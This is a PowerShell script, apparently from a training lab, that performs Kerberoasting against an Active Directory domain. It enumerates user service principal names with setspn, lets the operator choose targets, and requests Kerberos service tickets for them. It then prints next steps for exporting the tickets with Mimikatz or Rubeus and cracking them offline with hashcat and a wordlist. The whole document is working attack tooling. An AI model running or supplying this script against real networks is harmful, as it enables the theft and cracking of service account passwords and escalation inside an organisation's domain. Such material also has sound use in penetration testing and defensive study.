# Simple SPN Kerberoasting Tool

# Step 1: Query all SPNs using setspn
Write-Host "Querying SPNs in the domain..." -ForegroundColor Yellow
$SPNResults = setspn.exe -Q */* 2>$null

# Step 2: Extract user SPNs (filter out computer accounts)
$UserSPNs = @()
$CurrentUser = ""

foreach ($line in $SPNResults) {
    if ($line -match "^CN=([^,]+),CN=Users") {
        $CurrentUser = $matches[1]
    }
    elseif ($line -match "^CN=([^,]+),OU=.*Service Accounts") {
        $CurrentUser = $matches[1]
    }
    elseif ($line -match "^\s+([^/]+/[^:\s]+(:[0-9]+)?)") {
        $SPN = $matches[1].Trim()
        if ($CurrentUser -and $CurrentUser -notlike "krbtgt" -and $CurrentUser -notlike "ACADEMY-*") {
            $UserSPNs += @{
                User = $CurrentUser
                SPN = $SPN
            }
        }
    }
    elseif ($line -match "^CN=") {
        $CurrentUser = ""
    }
}

# Step 3: Display found user SPNs
Write-Host "`nFound User SPNs for Kerberoasting:" -ForegroundColor Green
Write-Host "=====================================" -ForegroundColor Green

$Counter = 1
$SPNList = @()

foreach ($item in $UserSPNs) {
    Write-Host "$Counter. User: $($item.User) | SPN: $($item.SPN)" -ForegroundColor Cyan
    $SPNList += $item.SPN
    $Counter++
}

# Step 4: Ask user which SPNs to target
Write-Host "`nSelect SPNs to request tickets for:" -ForegroundColor Yellow
Write-Host "1. All SPNs"
Write-Host "2. Specific SPN numbers (comma-separated)"
Write-Host "3. Manual SPN entry"

$choice = Read-Host "`nEnter choice (1-3)"

# Load required assembly
Add-Type -AssemblyName System.IdentityModel

switch ($choice) {
    "1" {
        # Request tickets for all SPNs
        Write-Host "`nRequesting tickets for ALL SPNs..." -ForegroundColor Yellow
        foreach ($spn in $SPNList) {
            try {
                Write-Host "Requesting ticket for: $spn" -ForegroundColor White
                $null = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
                Write-Host "  ✓ Success" -ForegroundColor Green
            }
            catch {
                Write-Host "  ✗ Failed: $($_.Exception.Message)" -ForegroundColor Red
            }
        }
    }
    "2" {
        # Request tickets for specific SPNs
        $selected = Read-Host "Enter SPN numbers (comma-separated, e.g., 1,3,5)"
        $numbers = $selected -split ',' | ForEach-Object { $_.Trim() }
        
        Write-Host "`nRequesting tickets for selected SPNs..." -ForegroundColor Yellow
        foreach ($num in $numbers) {
            $index = [int]$num - 1
            if ($index -ge 0 -and $index -lt $SPNList.Count) {
                $spn = $SPNList[$index]
                try {
                    Write-Host "Requesting ticket for: $spn" -ForegroundColor White
                    $null = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
                    Write-Host "  ✓ Success" -ForegroundColor Green
                }
                catch {
                    Write-Host "  ✗ Failed: $($_.Exception.Message)" -ForegroundColor Red
                }
            } else {
                Write-Host "Invalid SPN number: $num" -ForegroundColor Red
            }
        }
    }
    "3" {
        # Manual SPN entry
        $manualSPN = Read-Host "Enter manual SPN (e.g., MSSQLSvc/sqlserver.domain.com:1433)"
        try {
            Write-Host "Requesting ticket for: $manualSPN" -ForegroundColor White
            $null = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $manualSPN
            Write-Host "  ✓ Success" -ForegroundColor Green
        }
        catch {
            Write-Host "  ✗ Failed: $($_.Exception.Message)" -ForegroundColor Red
        }
    }
    default {
        Write-Host "Invalid choice!" -ForegroundColor Red
    }
}

# Step 5: Show next steps
Write-Host "`nNext Steps:" -ForegroundColor Yellow
Write-Host "1. Tickets are now in memory"
Write-Host "2. Use Mimikatz to extract tickets:"
Write-Host "   mimikatz # kerberos::list /export" -ForegroundColor White
Write-Host "3. Use Rubeus to extract tickets:"
Write-Host "   .\Rubeus.exe triage" -ForegroundColor White
Write-Host "4. Crack tickets with hashcat:"
Write-Host "   hashcat -m 13100 tickets.hash /usr/share/wordlists/rockyou.txt" -ForegroundColor White
